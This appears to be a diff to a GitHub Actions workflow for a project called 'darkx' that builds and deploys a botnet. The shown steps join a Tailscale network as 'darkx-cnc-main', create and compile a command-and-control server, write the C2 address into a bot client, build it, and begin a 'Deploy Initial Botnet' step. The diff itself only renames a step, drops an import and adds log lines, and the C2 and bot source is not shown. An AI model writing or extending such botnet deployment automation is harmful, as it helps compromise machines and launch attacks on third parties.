@@ -48,7 +48,7 @@ jobs:
         sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=darkx-cnc-main
         echo "CNC_IP=$(tailscale ip -4)" >> $GITHUB_ENV
 
-    - name: Create CNC Server
+    - name: Create Fixed CNC Server
       run: |
         cd darkx
         cat > cnc_server.go << 'EOF'
@@ -58,7 +58,6 @@ jobs:
             "bufio"
             "fmt"
             "net"
-            "os"
             "strings"
             "sync"
         )
@@ -277,9 +276,11 @@ jobs:
         cd darkx
         echo "Building DarkX components..."
         go build -o cnc cnc_server.go
+        echo "CNC built successfully"
         sed -i "s/CNC_IP_PLACEHOLDER/${{ env.CNC_IP }}/g" bot_client.go
         go build -o bot bot_client.go
-        echo "Components built successfully"
+        echo "Bot client built successfully"
+        echo "All components built successfully"
 
     - name: Deploy Initial Botnet
       run: |
